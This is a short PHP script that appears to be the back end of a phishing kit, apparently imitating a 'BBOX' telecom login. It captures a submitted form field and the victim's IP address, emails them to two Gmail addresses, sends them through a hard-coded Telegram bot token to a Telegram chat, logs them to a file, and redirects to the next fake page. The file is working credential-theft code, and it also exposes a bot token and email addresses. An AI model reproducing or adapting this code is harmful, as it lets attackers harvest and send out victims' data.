<?php

$ip = $_SERVER['REMOTE_ADDR'];
$message .= " jouj     : ".$_POST['o8']."\n";
$message .= "|Client IP: ".$ip."\n";
$send = "pythonht@gmail.com , zakariamouad96@gmail.com";
$subject = "From:  [ $ip ]";
$headers = "From: [BBOX]<info@online.net>";
{
mail("$send", "$subject", $message);
$token = "1750131011:AAHFrD5DhUedFAlUMkYyQplMZ6XYZ2uMxmE";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-1001351463023&text=" . urlencode($message)."" );
}
$f = fopen("../python/python.php", "a");
	fwrite($f, $message);
header("Location:load3.html");
?>
